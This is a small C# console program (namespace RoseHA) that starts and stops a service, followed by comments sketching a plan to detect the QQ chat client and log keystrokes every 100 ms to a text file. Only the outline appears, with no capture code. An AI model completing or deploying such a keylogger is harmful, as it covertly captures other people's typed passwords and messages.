using System;
using System.Collections.Generic;
using System.Text;

namespace RoseHA
{
    class Program
    {
        static void Main(string[] args)
        {
            RoseHAService rs = new RoseHAService();
            rs.OnStart(args);
            System.Threading.Thread.Sleep(500000);
            rs.OnStop();
            //1.check qq.exe
            //if true
            //2.check time 30s
            //while
            //3.get keyboard every 100ms
            //write to txt
            //4.close txt
        }
    }
}
